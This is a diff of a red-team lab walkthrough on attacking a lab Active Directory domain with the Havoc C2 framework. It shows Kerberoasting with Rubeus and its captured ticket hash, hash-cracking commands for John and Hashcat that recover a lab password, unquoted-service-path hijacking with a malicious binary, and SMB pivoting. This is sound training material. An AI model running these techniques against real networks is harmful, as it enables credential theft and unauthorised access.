@@ -51,9 +51,11 @@ Here are some terminologies that are exclusive to an Active Directory network in
 
 **Kerberos** is a crucial topic and contains some of the more well-known abuse primitives within Active Directory environments. It can also be a bit elusive as to how it works since it has so many complex intricacies.
 
-Services run on a machine under the context of a user account.  These accounts are either local to the machine (`NT AUTHORITY\SYSTEM`, `NT AUTHORITY\LOCAL SERVICE`, `NT AUTHORITY\NETWORK SERVICE`) or domain accounts (e.g. `HAVOC\s.chisholm`).  A Service Principal Name (SPN) is a unique identifier for a service instance.  SPNs are used with Kerberos to associate a service instance with a logon account, and are configured as an User Object in AD.
+Services run on a machine under the context of a user account.  These accounts are either local to the machine (`NT AUTHORITY\SYSTEM`, `NT AUTHORITY\LOCAL SERVICE`, `NT AUTHORITY\NETWORK SERVICE`) or domain accounts (e.g. `HAVOC\s.chisholm`).  
 
-Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service.  Kerberoasting is a technique for requesting TGS’ for services running under the context of domain accounts, and then cracking them offline to reveal their plaintext passwords.  Rubeus ***kerberoast*** can be used to perform Kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).
+A **Service Principal Name (SPN)** is a unique identifier for a service instance.  SPNs are used with Kerberos to associate a service instance with a logon account, and are configured as an User Object in AD.
+
+Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service. **Kerberoasting** is a technique for requesting TGS for services running under the context of domain accounts, and then cracking them offline to reveal their plaintext passwords.  Rubeus `kerberoast` can be used to perform Kerberoasting. Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).
 
 ```
 06/03/2023 15:07:08 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe kerberoast /simple /nowrap
@@ -76,7 +78,14 @@ Part of the TGS returned by the KDC is encrypted with a secret derived from the 
 $krb5tgs$23$*mssql_svc$havoc.local$DC01/mssql_svc.@havoc.local*$7139EC915D3F8A6D69BDCFC70272CE72$5D9CFAABFF7F8575AFF42152D2A26E583B82B7FDE6833E0E10A895A6B652134274DE1CBFD9F430E6F7EA55D79D752D80CD1E1503B32F70942F32F3C4E709F05B0168A372EA257A1B9B7ECD2056A377679780985F8295090B6717B8E95F01B9E7DB00933E85755D5DF4AFF80E3ED5B1D010F37C1A9B91345F1863C4CD34C973987317C56D169CC5128A540583C0F65AB4B6EC16F5E7230F68EA0743C2AC2912ABD0159B4518DD8165BA4994D9B1CF74BB5F2223D9BB32F41F417C7405F3551775F418899A45CACB9B13288CA9A5EB1706155C11DBAAD20703D5BD129353138ECAE4003DC49A2019BD9CE258F8ED5A1F6FFC1ACDE3CADAA64A07AF42D9ED61AC409241359135A70378D2991267628A673E37E0B849F54E5449E37265DC634C9BF9257AFC6EF0D5FEA1754B49895164DBE011FF71947991C8F8D8A0ACB4071CA1B85B51B99194BF821FC16D5968E435FE0ABCC080E7BDE9EAD02DEDF60A084ECC6C7348CF8CDF27F88614D24F81B533BE704BE4C2073D4283DAC9F2FC0220718543EC0F0F575EBEFDA26123A49B50FAC4DA6D6CCD2759061327B8DCFF9D5785A1936FAA2C1F9EA84A5BA041BBFF554FE3D4E046B2F6FF85904FD2F9BD9C27595E60B5449324B6F33AD8E6E0DA39E26985C8431D6C195B7E5F439B430F7CB5B7A478797AC25DCF692D24F2BCC3FAA531E419A0D22C13D933C106DDB8712E3664FFABDD6601AA6EC1C2C23C99425B674B9DBDF42DD388F59765ADE204C4BD30573C2818F3426750E71BA201C6912D624D70128FA2F3A092500D77223B8CF193B1D4DFC556F268AFEE63F6F803F9CCDEFA67A2DE7EF5E63F4571162153D33122CD4EBD9E9FE0E639A1FC32C491B1AC863CB91ACB9E799F5467A942EE10F7A1EB992F091689197AE5D144ADC6C6073CAC3497A553F540C579E34A247A3E2F526EF98E24BA0B1EF0B2E9A40B87063184379B130F3AE758A0C3C01F60687D1065A94FE00C1FE668BD236F537CACFA086F6664BE2C63638095900F980DA0901334A20B8EF2F15E95A1EA18DDDB60AF762C1B860F5F323F35E43D5AD7F96FA212E26DF3E941C5151896717C7CD74C52DC59847B4D05EC9DD77CEE18989BDE5125AC9CAE6F5988AF79C416DA90B0F18BE039E93D49B1C3851AC41E94562DD6540AF89D89C1BA1F61385649CA97C7BC782E06C91311CCAF8A8087584F1B0BB1B989B36DA02C96F6DC336E72EA50283BC8DCCF1872EDFD90A079E9671F5FB9BF74DF4546C03B8745EE3DBC6899742B2881A455DB77D8BAABCBF39F7CAF6421761C49B2DC8C3C4A30DC676424AC51BE8A83C6C451CEDBB31251BF7A910509E621112854FA8AA1A071FCAE7EF13D370FC1ED5D7790E2F5511A46165921585EE98E4FA96B5C3C7C2D5C67988520E98804531EA658DB2D339911BDFC59E3EA8BA34C687C461C16DA23DB9F51387D53DE3E2FFBC18D83F3630D39112F90B2B708FA934C0AA579A29AFB1224E999AAE634EBEAC0728BE2D307CCA23F2DCB8427C445A4E1FCC7B620F64D203A44413F1AB748F5E238F9E8B4AE53338AA94020417306C5CF847AFD9B5BD9A5CC27726B6DE8F4B57C9749A73567954C86E2803C795FC4372F711D3F3820D285A1A636B4DB20BC61812D45DF8F1122AEBF014289D46FAB31F82296DCA7BC2CB401675F9A1145393BD4008852F3AF7D44FBE865E7D805F852C390A83857C0A73D3F9A3184ECFC3D3FE3C1E943BFF6996738B9A42EA49963F77F3FE755
 ```
 
-The hash can be cracked offline to recover the plaintext password for the account (HAVOC\mssql_svc).  Use `--format=krb5tgs --wordlist=wordlist <hash>` for John the Ripper or `-a 0 -m 13100 <hash> <wordlist>` for Hashcat.
+The hash can be cracked offline to recover the plaintext password for the account `HAVOC\mssql_svc` by using either Hashcat or John the Ripper.  
+
+{% capture notice-2 %}
+ * John: `john --format=krb5tgs --wordlist=<wordlist> <hash>`
+ * Hashcat: `hashcat -a 0 -m 13100 <hash> <wordlist>`
+{% endcapture %}
+
+<div class="notice--info">{{ notice-2 | markdownify }}</div>
 
 ```
 $ john --format=krb5tgs --wordlist=wordlist mssql_svc
@@ -84,23 +93,32 @@ Password123!       (mssql_svc$havoc.local)
 ```
 
 ## 💻 Network Verification
-Before the practical walkthrough, ensure the AD network (DC01, WORKSTATION-01, WORKSTATION-02) are interconnected as intended. Hence, it is recommended to perform the following verifications:
+Before starting the practical walkthrough, ensure the AD network (**DC01**, **WORKSTATION-01**, **WORKSTATION-02**) are interconnected as intended. Hence, it is recommended to perform the following verifications:
 
 **1) Ensure that Domain Computers are attached to the Domain Controller.**
 
-Type the following command `nltest /sc_query:havoc.local` in both workstations to ensure domain connection. If the output contains the wording **Flags: 30 HAS_IP HAS_TIMESERV** and **Trusted DC Name \\\\DC01.havoc.local**, the specific workstation is connected to the `DC01` successfully. Otherwise, it is not connected to `havoc.local` domain.
+Type the following command `nltest /sc_query:havoc.local` in both workstations to ensure domain connection. 
+
+Ensure the output contains the wording below. Otherwise, it is not connected to `havoc.local` domain.
+
+```
+Flags: 30 HAS_IP HAS_TIMESERV Authentication Service: Netlogon
+Trusted DC Name \\DC01.havoc.local
+Trusted DC Connection Status Status = 0 0x0 NERR_SUCCESS
+The command completed successfully
+```
 
 ![WORKSTATION-01](https://media.giphy.com/media/eYMHsWjNsUiHcbexQa/giphy.gif)
 ![WORKSTATION-02](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExN2RkODRmZGMzZjc3NTIyNGI5Yjk1OWExNDdlNmUxMGY1YTMxMGI5ZSZjdD1n/6Ruy61n5BLVgmsgSTD/giphy.gif)
 
-Next, go to ***Start Menu > Type "Firewall"***. At the Domain networks, please verify that the **Active domain networks:** is `havoc.local`. If the active domain network is ***None***, this means that the specific workstation is not joined to the domain network.
+Next, go to **Start Menu > Type "Firewall"**. At the Domain networks, please verify that **Active domain networks:** `havoc.local`. If the active domain network is `None`, this implies that the specific workstation is not joined to the domain network.
 
 ![WORKSTATION-01](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNTc0NDg3NmJiZmY4NTU2OWM5YzRiMzI5YzJhM2NmZDU2YmE0OTY0YyZjdD1n/K4eQBRdvfSqYfJ9IIK/giphy.gif)
 ![WORKSTATION-02](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNGExMTM3ODY1NDM2MmYwZGVmODFiOGZmN2EwZDQ3N2U3NGM2YTc3MSZjdD1n/mOihdfEJ33tWlmIELf/giphy.gif)
 
 **2) Ensure that the Domain Computers can communicate with each other in the domain.**
 
-In **WORKSTATION-01** Windows Defender Firewall, click ***Advanced settings > Inbound Rules > File and Printer Sharing (Echo Request - ICMPv4-In)***, enable all the rules with ICMPv4-In **(Enabled: "Yes")**. Perform the same steps of verification in **WORKSTATION-02**.
+In **WORKSTATION-01** Windows Defender Firewall, click **Advanced settings > Inbound Rules > File and Printer Sharing (Echo Request - ICMPv4-In)**, enable all the rules with ICMPv4-In **(Enabled: "Yes")**. Perform the same steps of verification in **WORKSTATION-02**.
 
 ![WORKSTATION-01](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExODU4NjI5ZDUwNTk1NGFiMDkzNmM2NDk0YzEzNzNjOTg2ZTE2NzM4MyZjdD1n/o3ieXUduyKrBX2penp/giphy.gif)
 ![WORKSTATION-02](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMTEyMTEzMGFiNjdkMTcyNTFmY2M0YTQ3Njk3MmM3NzM0ZGQ4MTIwZCZjdD1n/s12zA77hbZUE6P5FzZ/giphy.gif)
@@ -130,7 +148,7 @@ Use the command `ipconfig` in both workstations to verify the number of adapters
 
 ![image](https://user-images.githubusercontent.com/107750005/222167859-1e1a9173-a3ea-41a2-9ad2-c8fd9029eb1f.png)
 
-In the scenario above, you are given an **Attacker Windows** with all the essentials tools required, **Attacker Linux** with Havoc Framework pre-installed, and access to a low-privileged user in **WORKSTATION-01**. All user credentials including "Domain Admins" had also been given in the course material because it is necessary for troubleshooting purposes, but it will not be required during the walkthrough. Addtionally, to prevent machines from auto-sleeping, go to ***Start Menu > Search for "Power, sleep, and battery settings" > Screen and sleep > Select "Never"***
+In the scenario above, you are given an **Attacker Windows** with all the essentials tools required, **Attacker Linux** with Havoc Framework pre-installed, and access to a low-privileged user in **WORKSTATION-01**. All user credentials including "Domain Admins" had also been given in the course material because it is necessary for troubleshooting purposes, but it will not be required during the walkthrough.
 
 | Machines         | Username    | Password       |
 |------------------|-------------|----------------|
@@ -232,7 +250,7 @@ C:\Program Files\HAVOC\binary files BUILTIN\Users:(W)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-Based on the output, BUILTIN\Users have write permission (W) on the `C:\Program Files\HAVOC\binary files` directory, which means we can upload a malicious binary to hijack this unquoted path.
+Based on the output, **BUILTIN\Users** have write permission (W) on the `C:\Program Files\HAVOC\binary files` directory, which means we can upload a malicious binary to hijack this unquoted path.
 
 [`SharpUp.exe`](https://github.com/GhostPack/SharpUp) can also be used to list any services that match these conditions.
 
@@ -284,7 +302,7 @@ Open `ServiceExec.sln` in Visual Studio and navigate to the following code block
 
 After that, build the Solution and transfer it to your Attacker Linux.
 
-In the **`a.tarolli/WORKSTATION-01`** demon, navigate to the vulnerable path, upload, and rename it to `executable.exe`.
+In the `a.tarolli/WORKSTATION-01` demon, navigate to the vulnerable path, upload, and rename it to `executable.exe`.
 
 ```
 06/03/2023 16:55:06 [5pider] Demon » cd C:\Program Files
@@ -612,7 +630,7 @@ Here is the video walkthrough covering Unconstrained Delegation vulnerability.
 {% include video id="sHB_REMIJNQ" provider="youtube" %}
 
 ### ⏫ Lateral Movement
-At the end of this section, you will also able to get a demon callback from WORKSTATION-02 using Server Message Block (SMB) pivot connect from WORKSTATION-01.
+At the end of this section, you will also able to get a demon callback from WORKSTATION-02 using **Server Message Block (SMB)** pivot connect from WORKSTATION-01.
 
 ![image](https://user-images.githubusercontent.com/107750005/222970318-730d3947-bbf5-489e-8e18-38ec3b9f98da.png)
 
